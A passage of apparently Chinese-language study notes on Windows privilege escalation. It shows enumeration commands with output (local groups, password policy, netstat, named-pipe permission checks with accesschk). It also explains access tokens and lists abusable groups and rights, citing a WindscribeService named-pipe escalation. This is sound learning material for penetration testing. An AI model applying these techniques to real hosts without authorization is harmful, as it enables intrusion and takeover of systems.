class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">Certificate</span> <span class="title">Service</span> <span class="title">DCOM</span> <span class="title">Access</span></span></span><br><span class="line"><span class="function">*<span class="title">Cryptographic</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">Distributed</span> <span class="title">COM</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Event</span> <span class="title">Log</span> <span class="title">Readers</span></span></span><br><span class="line"><span class="function">*<span class="title">Guests</span></span></span><br><span class="line"><span class="function">*<span class="title">Hyper</span>-<span class="title">V</span> <span class="title">Administrators</span></span></span><br><span class="line"><span class="function">*<span class="title">IIS_IUSRS</span></span></span><br><span class="line"><span class="function">*<span class="title">Network</span> <span class="title">Configuration</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">Performance</span> <span class="title">Log</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Performance</span> <span class="title">Monitor</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Power</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Print</span> <span class="title">Operators</span></span></span><br><span class="line"><span class="function">*<span class="title">RDS</span> <span class="title">Endpoint</span> <span class="title">Servers</span></span></span><br><span class="line"><span class="function">*<span class="title">RDS</span> <span class="title">Management</span> <span class="title">Servers</span></span></span><br><span class="line"><span class="function">*<span class="title">RDS</span> <span class="title">Remote</span> <span class="title">Access</span> <span class="title">Servers</span></span></span><br><span class="line"><span class="function">*<span class="title">Remote</span> <span class="title">Desktop</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Remote</span> <span class="title">Management</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">*<span class="title">Replicator</span></span></span><br><span class="line"><span class="function">*<span class="title">Storage</span> <span class="title">Replica</span> <span class="title">Administrators</span></span></span><br><span class="line"><span class="function">*<span class="title">System</span> <span class="title">Managed</span> <span class="title">Accounts</span> <span class="title">Group</span></span></span><br><span class="line"><span class="function">*<span class="title">Users</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<h3 id="特定组详情"><a href="#特定组详情" class="headerlink" title="特定组详情"></a>特定组详情</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">localgroup</span> <span class="title">administrators</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Alias</span> <span class="title">name</span>     <span class="title">administrators</span></span></span><br><span class="line"><span class="function"><span class="title">Comment</span>        <span class="title">Administrators</span> <span class="title">have</span> <span class="title">complete</span> <span class="title">and</span> <span class="title">unrestricted</span> <span class="title">access</span> <span class="title">to</span> <span class="title">the</span> <span class="title">computer</span>/<span class="title">domain</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Members</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">-------------------------------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="title">Administrator</span></span></span><br><span class="line"><span class="function"><span class="title">helpdesk</span></span></span><br><span class="line"><span class="function"><span class="title">sarah</span></span></span><br><span class="line"><span class="function"><span class="title">secsvc</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>. </span></span><br></pre></td></tr></table></figure>

<h3 id="密码策略"><a href="#密码策略" class="headerlink" title="密码策略"></a>密码策略</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">accounts</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Force</span> <span class="title">user</span> <span class="title">logoff</span> <span class="title">how</span> <span class="title">long</span> <span class="title">after</span> <span class="title">time</span> <span class="title">expires</span>?:       <span class="title">Never</span></span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          0</span></span><br><span class="line"><span class="function"><span class="title">Maximum</span> <span class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          42</span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">length</span>:                              0</span></span><br><span class="line"><span class="function"><span class="title">Length</span> <span class="title">of</span> <span class="title">password</span> <span class="title">history</span> <span class="title">maintained</span>:                <span class="title">None</span></span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">threshold</span>:                                    <span class="title">Never</span></span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">duration</span> (<span class="title">minutes</span>):                           30</span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">observation</span> <span class="title">window</span> (<span class="title">minutes</span>):                 30</span></span><br><span class="line"><span class="function"><span class="title">Computer</span> <span class="title">role</span>:                                        <span class="title">SERVER</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<h3 id="密码策略和其他帐户信息"><a href="#密码策略和其他帐户信息" class="headerlink" title="密码策略和其他帐户信息"></a>密码策略和其他帐户信息</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">net</span> <span class="title">accounts</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Force</span> <span class="title">user</span> <span class="title">logoff</span> <span class="title">how</span> <span class="title">long</span> <span class="title">after</span> <span class="title">time</span> <span class="title">expires</span>?:       <span class="title">Never</span></span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          0</span></span><br><span class="line"><span class="function"><span class="title">Maximum</span> <span class="title">password</span> <span class="title">age</span> (<span class="title">days</span>):                          42</span></span><br><span class="line"><span class="function"><span class="title">Minimum</span> <span class="title">password</span> <span class="title">length</span>:                              0</span></span><br><span class="line"><span class="function"><span class="title">Length</span> <span class="title">of</span> <span class="title">password</span> <span class="title">history</span> <span class="title">maintained</span>:                <span class="title">None</span></span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">threshold</span>:                                    <span class="title">Never</span></span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">duration</span> (<span class="title">minutes</span>):                           30</span></span><br><span class="line"><span class="function"><span class="title">Lockout</span> <span class="title">observation</span> <span class="title">window</span> (<span class="title">minutes</span>):                 30</span></span><br><span class="line"><span class="function"><span class="title">Computer</span> <span class="title">role</span>:                                        <span class="title">SERVER</span></span></span><br><span class="line"><span class="function"><span class="title">The</span> <span class="title">command</span> <span class="title">completed</span> <span class="title">successfully</span>.</span></span><br></pre></td></tr></table></figure>

<hr>
<h1 id="Process-Communication"><a href="#Process-Communication" class="headerlink" title="Process Communication"></a>Process Communication</h1><h2 id="Access-Tokens"><a href="#Access-Tokens" class="headerlink" title="Access Tokens"></a>Access Tokens</h2><p>在 Windows 中，<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">访问令牌</a>用于描述进程或线程的安全上下文（安全属性或规则）。令牌包含有关用户帐户身份和与特定进程或线程相关的权限的信息。当用户向系统进行身份验证时，系统会根据安全数据库验证其密码，如果验证正确，则会为其分配一个访问令牌。每次用户与进程交互时，都会提供此令牌的副本以确定其权限级别。</p>
<h2 id="Network-Services"><a href="#Network-Services" class="headerlink" title="Network Services"></a>Network Services</h2><p>与进程交互的最常见方式是通过网络套接字（DNS、HTTP、SMB 等）。netstat<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat">命令</a>将显示活动的 TCP 和 UDP 连接，这将使更好地了解哪些服务正在本地和外部可访问的端口上监听。可能会发现一个只有本地主机可访问的易受攻击的服务（登录到主机时），可以利用它来提升权限。</p>
<h3 id="活动网络连接"><a href="#活动网络连接" class="headerlink" title="活动网络连接"></a>活动网络连接</h3><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">netstat</span> -<span class="title">ano</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Active</span> <span class="title">Connections</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">  <span class="title">Proto</span>  <span class="title">Local</span> <span class="title">Address</span>          <span class="title">Foreign</span> <span class="title">Address</span>        <span class="title">State</span>           <span class="title">PID</span></span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:21             0.0.0.0:0              <span class="title">LISTENING</span>       3812</span></span><br><span class="line"><span class="function">  <span class="title">TCP</span>    0.0.0.0:80             0.0.0.0:0              <span class="title">LISTENING</span>       4</span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="命名管道"><a href="#命名管道" class="headerlink" title="命名管道"></a>命名管道</h3><p>进程之间通信的另一种方式是通过命名管道。管道本质上是存储在内存中的文件，读取后会被清除。</p>
<p>管道有两种类型：<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/ipc/named-pipes">命名管道</a>和匿名管道。命名管道的一个例子是<code>\\.\PipeName\\ExampleNamedPipeServer</code>。Windows 系统使用客户端-服务器实现进行管道通信。</p>
<p>Sysinternals Suite 中的工具<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist">PipeList</a>来枚举命名管道的实例</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">pipelist.exe</span> /<span class="title">accepteula</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">PipeList</span> <span class="title">v1</span>.02 - <span class="title">Lists</span> <span class="title">open</span> <span class="title">named</span> <span class="title">pipes</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2005-2016 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Pipe</span> <span class="title">Name</span>                                    <span class="title">Instances</span>       <span class="title">Max</span> <span class="title">Instances</span></span></span><br><span class="line"><span class="function">---------                                    ---------       -------------</span></span><br><span class="line"><span class="function"><span class="title">InitShutdown</span>                                      3               -1</span></span><br><span class="line"><span class="function"><span class="title">lsass</span>                                             4               -1</span></span><br><span class="line"><span class="function"><span class="title">ntsvcs</span>                                            3               -1</span></span><br><span class="line"><span class="function"><span class="title">scerpc</span>                                            3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-340-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-414-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">epmapper</span>                                          3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-3<span class="title">ec</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-44<span class="title">c</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">LSM_API_service</span>                                   3               -1</span></span><br><span class="line"><span class="function"><span class="title">atsvc</span>                                             3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-5<span class="title">e0</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">eventlog</span>                                          3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-6<span class="title">a8</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">spoolss</span>                                           3               -1</span></span><br><span class="line"><span class="function"><span class="title">Winsock2</span>\<span class="title">CatalogChangeListener</span>-<span class="title">ec0</span>-0              1                1</span></span><br><span class="line"><span class="function"><span class="title">wkssvc</span>                                            4               -1</span></span><br><span class="line"><span class="function"><span class="title">trkwks</span>                                            3               -1</span></span><br><span class="line"><span class="function"><span class="title">vmware</span>-<span class="title">usbarbpipe</span>                                 5               -1</span></span><br><span class="line"><span class="function"><span class="title">srvsvc</span>                                            4               -1</span></span><br><span class="line"><span class="function"><span class="title">ROUTER</span>                                            3               -1</span></span><br><span class="line"><span class="function"><span class="title">vmware</span>-<span class="title">authdpipe</span>                                  1                1</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;<span class="title">SNIP</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>powershell Get-ChildItem 列出命名管道</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\&gt;  <span class="built_in">gci</span> \\.\pipe\</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\.\pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">3</span> InitShutdown</span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">4</span> lsass</span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">3</span> ntsvcs</span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">3</span> scerpc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\.\pipe\Winsock2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">1</span> Winsock2\CatalogChangeListener<span class="literal">-34c-0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: \\.\pipe</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line"><span class="literal">------</span>       <span class="number">12</span>/<span class="number">31</span>/<span class="number">1600</span>   <span class="number">4</span>:<span class="number">00</span> PM              <span class="number">3</span> epmapper</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="LSASS-命名管道权限"><a href="#LSASS-命名管道权限" class="headerlink" title="LSASS 命名管道权限"></a>LSASS 命名管道权限</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> /<span class="title">accepteula</span> \\.\<span class="title">Pipe</span>\<span class="title">lsass</span> -<span class="title">v</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.12 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2006-2017 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">\\.\<span class="title">Pipe</span>\<span class="title">lsass</span></span></span><br><span class="line"><span class="function">  <span class="title">Untrusted</span> <span class="title">Mandatory</span> <span class="title">Level</span> [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">Everyone</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">SYNCHRONIZE</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">ANONYMOUS</span> <span class="title">LOGON</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">SYNCHRONIZE</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">APPLICATION</span> <span class="title">PACKAGE</span> <span class="title">AUTHORITY</span>\<span class="title">Your</span> <span class="title">Windows</span> <span class="title">credentials</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_READ_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_ATTRIBUTES</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_DATA</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_WRITE_EA</span></span></span><br><span class="line"><span class="function">        <span class="title">SYNCHRONIZE</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure>

<h4 id="命名管提升权限的示例"><a href="#命名管提升权限的示例" class="headerlink" title="命名管提升权限的示例"></a>命名管提升权限的示例</h4><p><a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/48021">WindscribeService 命名管道权限提升</a> ，使用 accesschk，可以使用 <code>accesschk.exe -w \pipe\* -v</code> 等命令搜索允许写入访问的所有命名管道，并注意到 WindscribeService 命名管道允许 Everyone 组（即所有经过身份验证的用户）进行读取和写入访问。</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> -<span class="title">accepteula</span> -<span class="title">w</span> \<span class="title">pipe</span>\<span class="title">WindscribeService</span> -<span class="title">v</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.13 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> ⌐ 2006-2020 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">\\.\<span class="title">Pipe</span>\<span class="title">WindscribeService</span></span></span><br><span class="line"><span class="function">  <span class="title">Medium</span> <span class="title">Mandatory</span> <span class="title">Level</span> (<span class="title">Default</span>) [<span class="title">No</span>-<span class="title">Write</span>-<span class="title">Up</span>]</span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">Everyone</span></span></span><br><span class="line"><span class="function">        <span class="title">FILE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure>

<p>检查 WindscribeService 命名管道权限，使用 accesschk 确认后，发现 Everyone 组确实对管道拥有 FILE_ALL_ACCESS（所有可能的访问权限）。可以利用这些宽松的权限将主机上的权限升级到 SYSTEM。</p>
<hr>
<h1 id="Privileges-Overview"><a href="#Privileges-Overview" class="headerlink" title="Privileges Overview"></a>Privileges Overview</h1><p><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privileges">Windows 中的权限</a>是授予帐户在本地系统上执行各种操作的权利，例如管理服务、加载驱动程序、关闭系统、调试应用程序等。权限不同于访问权限，访问权限是系统用来授予或拒绝对可安全对象的访问的权利。用户和组权限存储在数据库中，并在用户登录系统时通过访问令牌授予。如果帐户属于 Active Directory 域，则帐户可以在特定计算机上拥有本地权限，并在不同的系统上拥有不同的权限。</p>
<h2 id="Windows-Authorization-Process"><a href="#Windows-Authorization-Process" class="headerlink" title="Windows Authorization Process"></a>Windows Authorization Process</h2><p>安全主体是 Windows 操作系统可以验证的任何内容，包括用户和计算机帐户、在安全上下文或其他用户&#x2F;计算机帐户中运行的进程，或这些帐户所属的安全组。安全主体是控制对 Windows 主机上的资源的访问的主要方式。每个安全主体都由唯一的<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/security-identifiers-in-windows">安全标识符 (SID)</a>标识。创建安全主体时，会为其分配一个 SID，该 SID 在其生命周期内一直分配给该主体。</p>
<p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2024/image-1732174929454.png" alt="auth_process"></p>
<h2 id="Rights-and-Privileges"><a href="#Rights-and-Privileges" class="headerlink" title="Rights and Privileges"></a>Rights and Privileges</h2><p>Windows 包含许多组，这些组授予其成员强大的权利和特权。其中许多组可以被滥用来提升独立 Windows 主机和 Active Directory 域环境中的特权。最终，这些组可用于在 Windows 工作站、服务器或域控制器 (DC) 上获得域管理员、本地管理员或系统特权。下面列出了其中一些组。</p>
<table>
<thead>
<tr>
<th>Group</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>Default Administrators</td>
<td>域管理员和企业管理员是“超级”组。</td>
</tr>
<tr>
<td>Server Operators</td>
<td>成员可以修改服务、访问 SMB 共享和备份文件。</td>
</tr>
<tr>
<td>Backup Operators</td>
<td>成员可以在本地登录 DC，应被视为域管理员。他们可以制作 SAM&#x2F;NTDS 数据库的卷影副本、远程读取注册表以及通过 SMB 访问 DC 上的文件系统。此组有时会添加到非 DC 上的本地备份操作员组中。</td>
</tr>
<tr>
<td>Print Operators</td>
<td>成员可以本地登录 DC 并“诱骗” Windows 加载恶意驱动程序。</td>
</tr>
<tr>
<td>Hyper-V Administrators</td>
<td>如果存在虚拟 DC，则任何虚拟化管理员（例如 Hyper-V 管理员成员）都应被视为域管理员。</td>
</tr>
<tr>
<td>Account Operators</td>
<td>成员可以修改域中不受保护的帐户和组。</td>
</tr>
<tr>
<td>Remote Desktop Users</td>
<td>默认情况下，成员没有被赋予任何有用的权限，但通常会被授予额外的权利，例如<code>Allow Login Through Remote Desktop Services</code>可以使用 RDP 协议横向移动。</td>
</tr>
<tr>
<td>Remote Management Users</td>
<td>成员可以使用 PSRemoting 登录到 DC（此组有时会添加到非 DC 上的本地远程管理组）。</td>
</tr>
<tr>
<td>Group Policy Creator Owners</td>
<td>成员可以创建新的 GPO，但需要委派额外的权限才能将 GPO 链接到域或 OU 等容器。</td>
</tr>
<tr>
<td>Schema Admins</td>
<td>成员可以修改 Active Directory 架构结构，并通过将受感染的帐户添加到默认对象 ACL 来为任何要创建的组&#x2F;GPO 设置后门。</td>
</tr>
<tr>
<td>DNS Admins</td>
<td>成员可以在 DC 上加载 DLL，但没有重新启动 DNS 服务器所需的权限。他们可以加载恶意 DLL 并等待重新启动作为持久性机制。加载 DLL 通常会导致服务崩溃。利用此组的更可靠方法是创建<a target="_blank" rel="noopener" href="https://web.archive.org/web/20231115070425/https://cube0x0.github.io/Pocing-Beyond-DA/">WPAD 记录</a>。</td>
</tr>
</tbody></table>
<h3 id="用户权限分配"><a href="#用户权限分配" class="headerlink" title="用户权限分配"></a>用户权限分配</h3><p>根据组成员身份和其他因素（例如通过域和本地组策略分配的权限），用户可以为其帐户分配各种权限。以下是一些关键的用户权限分配，它们是应用于本地主机的设置。这些权限允许用户在系统上执行任务，例如本地或远程登录、从网络访问主机、关闭服务器等。</p>
<table>
<thead>
<tr>
<th>Setting <a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants">Constant</a></th>
<th>Setting Name</th>
<th>Standard Assignment</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>SeNetworkLogonRight</td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/access-this-computer-from-the-network">Access this computer from the network</a></td>
<td>Administrators, Authenticated Users</td>
<td>确定哪些用户可以从网络连接到设备。这是 SMB、NetBIOS、CIFS 和 COM+ 等网络协议所必需的。</td>
</tr>
<tr>
<td>SeRemoteInteractiveLogonRight</td>
<td><a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/allow-log-on-through-remote-desktop-services">Allow log on through Remote Desktop Services</a></td>
<td>Administrators, Remote Desktop Users</td>
